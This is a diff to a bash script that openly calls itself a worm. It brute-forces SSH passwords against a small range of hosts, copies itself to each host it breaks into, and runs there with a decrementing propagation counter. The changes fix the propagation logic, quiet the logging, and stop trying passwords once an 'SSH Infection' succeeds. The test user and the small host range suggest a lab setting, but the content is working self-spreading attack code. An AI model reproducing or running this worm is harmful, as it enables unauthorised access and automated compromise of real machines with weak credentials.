@@ -10,7 +10,13 @@ MIN_HOST=1
 MAX_HOST=6
 WORM="$0"
 PROPAGATION=$1
-VICTIM_PROPAGATION=`expr $PROPAGATION - 1`
+
+if [ "$PROPAGATION" -ne "1" ]; then
+	VICTIM_PROPAGATION=`expr $PROPAGATION - 1`
+else
+	VICTIM_PROPAGATION=1
+fi
+
 
 # Data to use in the brute force attack
 USER="test"
@@ -49,7 +55,7 @@ do
 	echo "[ $MY_IP] The target IP of the propagation number $VICTIM is $IP"
 	for PASS in "${PASSWORDS[@]}"
 	do
-		echo "[ $MY_IP] Trying user = $USER with password = $PASS"
+		# echo "[ $MY_IP] Trying user = $USER with password = $PASS"
 
 		# Execute the worm on the remote host using sshpass
 		sshpass -p $PASS ssh -o StrictHostKeyChecking=no $USER@$IP \
@@ -59,9 +65,8 @@ do
 			./$NEW_NAME $VICTIM_PROPAGATION" # 2> /dev/null
 
 		if [ $? -eq 0 ]; then
-		    echo "OK"
-		else
-		    echo "FAIL"
+		    echo "[ $MY_IP] SSH Infection at $IP SUCCEEDED!"
+		    break
 		fi
 	done
 	
